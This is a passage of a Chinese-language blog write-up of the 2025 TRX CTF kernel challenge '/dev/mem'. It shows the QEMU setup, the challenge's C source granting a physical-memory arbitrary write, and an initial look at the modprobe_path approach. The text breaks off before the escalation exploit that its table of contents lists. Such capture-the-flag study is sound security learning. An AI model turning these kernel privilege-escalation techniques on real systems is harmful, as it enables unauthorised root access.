
  <!DOCTYPE html>
  <html lang="en"  >
  <head>
  <meta charset="utf-8">
  

  

  

  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"copy success(*^▽^*)","fail":"copy failed (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"Naup"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
  
  <title>
    2025 TRX CTF - /dev/mem |
    
    堇姬 Naup&#39;s Blog
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
  
    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  
    
<link rel="stylesheet" href="/css/loader.css">

  
  
    <meta name="description" content="2025 TRX CTF - &#x2F;dev&#x2F;mem Author : 堇姬 Naup  前置123mkdir -p sysfilegunzip initramfs.cpio.gzcpio -idmv -D sysfile &lt; initramfs.cpio  把 cpio 解壓後，先把 pack.sh 寫好 之後來修 run.sh 12345678910111213141516">
<meta property="og:type" content="article">
<meta property="og:title" content="2025 TRX CTF - &#x2F;dev&#x2F;mem">
<meta property="og:url" content="http://example.com/2025/04/11/Linux-Kernel-2025-TRX-CTF-devmem/index.html">
<meta property="og:site_name" content="堇姬 Naup&#39;s Blog">
<meta property="og:description" content="2025 TRX CTF - &#x2F;dev&#x2F;mem Author : 堇姬 Naup  前置123mkdir -p sysfilegunzip initramfs.cpio.gzcpio -idmv -D sysfile &lt; initramfs.cpio  把 cpio 解壓後，先把 pack.sh 寫好 之後來修 run.sh 12345678910111213141516">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/SJSKrYJAkg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkQrUh1Ayg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1l8Uny0yl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkShZoxA1e.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkMUUhxAJl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Byj1Onx0Jl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hkyvuhg0yx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Bk3k4pxRJg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1St0VQAyg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ry0STQZAJe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJ7C-D7Rkg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rytJGdUR1e.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ry9mJqNAkl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HyTVy54Ryg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkaPJq4CJl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJwMZ54Ayx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hk1t-T4C1x.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ByyjZTN0yg.png">
<meta property="article:published_time" content="2025-04-11T10:42:52.000Z">
<meta property="article:modified_time" content="2025-05-14T10:35:43.516Z">
<meta property="article:author" content="Naup堇姬">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/SJSKrYJAkg.png">
  
  
    <link rel="alternate" href="/atom.xml" title="堇姬 Naup's Blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/images/fav.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
  
  
  
  
    
<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>

  
  
    
<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">

  
  
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>

  <body>
    
  <div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi">
        
          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
          </svg>
        
      </div>
      <div class="loading-word">Naup...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var startLoading = () => {
      time = Date.now();
      document.getElementById('loader').classList.remove("loading");
    }
    var endLoading = () => {
      if (!time) {
        document.body.style.overflow = 'auto';
        document.getElementById('loader').classList.add("loading");
      } else {
        if (Date.now() - time > 500) {
          time = null;
          document.body.style.overflow = 'auto';
          document.getElementById('loader').classList.add("loading");
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    document.getElementById('loader').addEventListener('click', endLoading);
  </script>

<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>


    <div id="container">
      <div id="wrap">
        <div id="header-nav">
  <nav id="main-nav">
    
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
            &#xe62b;
          </div>
          <a class="main-nav-link" href="/">Home</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
            &#xe62b;
          </div>
          <a class="main-nav-link" href="/archives">Archives</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
            &#xe62b;
          </div>
          <a class="main-nav-link" href="/about">About</a>
        </span>
      
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
    
    
    
  </nav>
</div>
<header id="header">
  
    <picture></picture>
    <img fetchpriority="high" src="/images/posts_cover/trxctf/TRXCTF.png" alt="2025 TRX CTF - /dev/mem">
  
  <div id="header-outer">
    <div id="header-title">
      
        
        
          <a href="/" id="logo">
            <h1 data-aos="slide-up">2025 TRX CTF - /dev/mem</h1>
          </a>
        
      
      
        
        <h2 id="subtitle-wrap" data-aos="slide-down">
          
        </h2>
      
    </div>
  </div>
</header>

        <div id="content"  class="sidebar-right" >
          <aside id="sidebar">
  
  
  <div class="sidebar-wrapper wrap-sticky">
    <div class="sidebar-wrap" data-aos="fade-up">
      
        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2025-TRX-CTF-dev-mem"><span class="toc-number">1.</span> <span class="toc-text">2025 TRX CTF - &#x2F;dev&#x2F;mem</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">前置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#analyze-code"><span class="toc-number">1.2.</span> <span class="toc-text">analyze code</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#modprobe-not-be-use"><span class="toc-number">1.2.1.</span> <span class="toc-text">modprobe not be use</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#broken-KASLR"><span class="toc-number">1.3.</span> <span class="toc-text">broken KASLR</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#physical-base-address"><span class="toc-number">1.3.1.</span> <span class="toc-text">physical base address</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kernel-physical-and-Virtual-base-relation"><span class="toc-number">1.3.2.</span> <span class="toc-text">Kernel physical and Virtual base relation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KASLR-physical-address"><span class="toc-number">1.3.3.</span> <span class="toc-text">KASLR physical address</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#virtual-address-base"><span class="toc-number">1.3.4.</span> <span class="toc-text">virtual address base</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Control-RIP"><span class="toc-number">1.4.</span> <span class="toc-text">Control RIP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-TTY-device"><span class="toc-number">1.4.1.</span> <span class="toc-text">What is TTY device</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pty-%E8%99%9B%E6%93%AC%E7%B5%82%E7%AB%AF"><span class="toc-number">1.4.2.</span> <span class="toc-text">pty (虛擬終端)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dev-ptmx"><span class="toc-number">1.4.3.</span> <span class="toc-text">&#x2F;dev&#x2F;ptmx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#source-code-about-ptmx"><span class="toc-number">1.4.4.</span> <span class="toc-text">source code about ptmx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#n-tty-ops"><span class="toc-number">1.4.5.</span> <span class="toc-text">n_tty_ops</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E8%AE%80"><span class="toc-number">1.5.</span> <span class="toc-text">任意讀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kernel-memory-%E4%BB%BB%E6%84%8F%E8%AE%80"><span class="toc-number">1.5.1.</span> <span class="toc-text">kernel memory 任意讀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%9D%91%E9%BB%9E%E7%9A%84-kernel-panic"><span class="toc-number">1.5.2.</span> <span class="toc-text">小坑點的 kernel panic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-%E4%BB%BB%E6%84%8F%E8%AE%80"><span class="toc-number">1.5.3.</span> <span class="toc-text">exploit 任意讀</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EoP"><span class="toc-number">1.6.</span> <span class="toc-text">EoP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#init-process"><span class="toc-number">1.6.1.</span> <span class="toc-text">init process</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task-struct"><span class="toc-number">1.6.2.</span> <span class="toc-text">task_struct</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE-offset-%E5%95%8F%E9%A1%8C"><span class="toc-number">1.6.3.</span> <span class="toc-text">找 offset 問題</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EoP-success"><span class="toc-number">1.6.4.</span> <span class="toc-text">EoP success</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#demo"><span class="toc-number">1.7.</span> <span class="toc-text">demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">1.8.</span> <span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#after-all"><span class="toc-number">1.9.</span> <span class="toc-text">after all</span></a></li></ol></li></ol>
      
  </div>
</div>
</div>
        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
  <div class="sidebar-author-name">Naup堇姬</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    <div class="sidebar-state-number">79</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">0</div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">21</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-email sidebar-social-icon">
      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
    </div>
  
    <div class="icon-github sidebar-social-icon">
      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">Home</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">Archives</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">About</div>
      </div>
    
  
</div>
</div>
      
      
        <div class="sidebar-btn-wrapper" style="position:static">
          <div class="sidebar-toc-btn current"></div>
          <div class="sidebar-common-btn"></div>
        </div>
      
    </div>
  </div>

  <div class="sidebar-widget">
  
  </div>
</aside>

          <section id="main"><article id="post-Linux-Kernel-2025-TRX-CTF-devmem" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-inner" data-aos="fade-up">
    <div class="article-meta">
      <div class="article-date">
  <a href="/2025/04/11/Linux-Kernel-2025-TRX-CTF-devmem/" class="article-date-link" data-aos="zoom-in">
    <time datetime="2025-04-11T10:42:52.000Z" itemprop="datePublished">2025-04-11</time>
    <time style="display: none;" id="post-update-time">2025-05-14</time>
  </a>
</div>

      

    </div>
    <div class="hr-line"></div>
    

    <div class="e-content article-entry" itemprop="articleBody">
      
      
        <h1 id="2025-TRX-CTF-dev-mem"><a href="#2025-TRX-CTF-dev-mem" class="headerlink" title="2025 TRX CTF - &#x2F;dev&#x2F;mem"></a>2025 TRX CTF - &#x2F;dev&#x2F;mem</h1><blockquote>
<p>Author : 堇姬 Naup</p>
</blockquote>
<h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p sysfile</span><br><span class="line">gunzip initramfs.cpio.gz</span><br><span class="line">cpio -idmv -D sysfile &lt; initramfs.cpio</span><br></pre></td></tr></table></figure>

<p>把 cpio 解壓後，先把 pack.sh 寫好</p>
<p>之後來修 run.sh</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">naup@naup-virtual-machine:~/Desktop/pwn/devmem$ <span class="built_in">cat</span> run.sh </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">TIMEOUT=40</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;No exploit supplied&quot;</span></span><br><span class="line">    <span class="comment"># No exploit executable supplied</span></span><br><span class="line">    qemu-system-x86_64 \</span><br><span class="line">        -kernel ./bzImage \</span><br><span class="line">        -initrd ./initramfs.cpio.gz \</span><br><span class="line">        -cpu qemu64,+smap,+smep \</span><br><span class="line">        -smp 1 \</span><br><span class="line">        -m 1G \</span><br><span class="line">        -append <span class="string">&quot;console=ttyS0 quiet loglevel=3 oops=panic panic_on_warn=1 panic=-1 pti=on&quot;</span> \</span><br><span class="line">        -no-reboot \</span><br><span class="line">        -nographic \</span><br><span class="line">        -monitor /dev/null</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Exploit supplied&quot;</span></span><br><span class="line">    <span class="comment"># Exploit executable supplied as first argument</span></span><br><span class="line">    qemu-system-x86_64 \</span><br><span class="line">        -kernel ./bzImage \</span><br><span class="line">        -initrd ./initramfs.cpio.gz \</span><br><span class="line">        -cpu qemu64,+smap,+smep \</span><br><span class="line">        -smp 1 \</span><br><span class="line">        -m 1G \</span><br><span class="line">        -append <span class="string">&quot;console=ttyS0 quiet loglevel=3 oops=panic panic_on_warn=1 panic=-1 pti=on&quot;</span> \</span><br><span class="line">        -no-reboot \</span><br><span class="line">        -nographic \</span><br><span class="line">        -monitor /dev/null \</span><br><span class="line">        -drive file=<span class="variable">$1</span>,format=raw,index=0,media=disk</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>他根據是否有提供 exploit 來決定要不要掛進去一個 disk<br>為了本地 debug 方便重寫一個 start.sh</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./initramfs.cpio \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor none \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 oops=panic panic_on_warn=1 panic=-1 pti=on&quot;</span> \</span><br><span class="line">    -no-reboot</span><br></pre></td></tr></table></figure>

<p>有開 KPTI、SMAP、SMEP</p>
<h2 id="analyze-code"><a href="#analyze-code" class="headerlink" title="analyze code"></a>analyze code</h2><p>底下給了這些檔案</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">naup@naup-virtual-machine:~/Desktop/pwn/devmem$ ls</span><br><span class="line">bzImage  chall.c  hashcash.py  initramfs.cpio.gz  kernel.config  run.sh</span><br></pre></td></tr></table></figure>

<p>先來分析 source code</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEV <span class="string">&quot;/dev/mem&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_PAGE_BASE(address) address &amp; ~(PAGE_SIZE-1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_OFFSET(address) address &amp; (PAGE_SIZE-1) </span></span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">get_long</span><span class="params">(<span class="type">char</span>* str, <span class="type">unsigned</span> <span class="type">long</span>* value)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">physical_write</span><span class="params">(<span class="type">int</span> dev, <span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">unsigned</span> <span class="type">long</span> value)</span>;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_long</span><span class="params">(<span class="type">char</span>* str, <span class="type">unsigned</span> <span class="type">long</span>* value)</span>&#123;</span><br><span class="line">    <span class="type">char</span>* check;</span><br><span class="line"></span><br><span class="line">    *value = strtoul(str, &amp;check, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(check == str)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">physical_write</span><span class="params">(<span class="type">int</span> dev, <span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">unsigned</span> <span class="type">long</span> value)</span>&#123;</span><br><span class="line">    <span class="type">int</span> br;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(lseek(dev, address, SEEK_SET) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    br = write(dev, &amp;value, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(br == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> address, value;</span><br><span class="line">    <span class="type">int</span> dev, check;</span><br><span class="line"></span><br><span class="line">    dev = open(DEV, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(dev == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;could not open &quot;</span> DEV);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;./chall &lt;address&gt; &lt;value&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    check = get_long(argv[<span class="number">1</span>], &amp;address);</span><br><span class="line">    <span class="keyword">if</span>(check || (address &amp; (<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)<span class="number">-1</span>)) != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invalid address&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    check = get_long(argv[<span class="number">2</span>], &amp;value);</span><br><span class="line">    <span class="keyword">if</span>(check)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invalid value&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(physical_write(dev, address, value) != <span class="number">0</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;could not interact with &quot;</span> DEV);</span><br><span class="line"></span><br><span class="line">    close(dev);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先要先了解 <code>/dev/mem</code> 是啥<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/skyflying2012/article/details/47611399">https://blog.csdn.net/skyflying2012/article/details/47611399</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/linjiasen/article/details/103408631">https://blog.csdn.net/linjiasen/article/details/103408631</a></p>
<p>我們可以通過 &#x2F;dev&#x2F;mem 在 userspace 來對 physical address 來做讀寫<br>與他互動的方式是 <code>/usr/sbin/chall address value</code><br>他會將傳入的 address 跟 value 做 strtoul<br>將字符串 str 轉換為無符號長整型（unsigned long）數值，並將其存儲到 value 指向的變量中。這裡使用了基數 16，表示將字符串 str 按十六進制進行解析</p>
<p>lseek(dev, address, SEEK_SET)：將文件指標（file pointer）移動到指定的偏移量位置。具體來說，它會將文件指標移動到 address 位置，並且這個偏移是相對於文件的開頭（由 SEEK_SET 指定）</p>
<p>並對 address 寫入 value<br>也就是有個 physical address 任意寫</p>
<p>第一個直覺的想法就是寫 modprobe_path<br>但 …</p>
<h3 id="modprobe-not-be-use"><a href="#modprobe-not-be-use" class="headerlink" title="modprobe not be use"></a>modprobe not be use</h3><p><a target="_blank" rel="noopener" href="https://naupjjin.github.io/2025/04/04/Linux-Kernel-modprobe-EoP-and-2021-3kctf-echo-nerf/">https://naupjjin.github.io/2025/04/04/Linux-Kernel-modprobe-EoP-and-2021-3kctf-echo-nerf/</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">naup@naup-virtual-machine:~/Desktop/pwn/devmem$ cat kernel.config | grep USERMODEHELPER</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=<span class="string">&quot;/sbin/usermode-helper&quot;</span></span><br></pre></td></tr></table></figure>
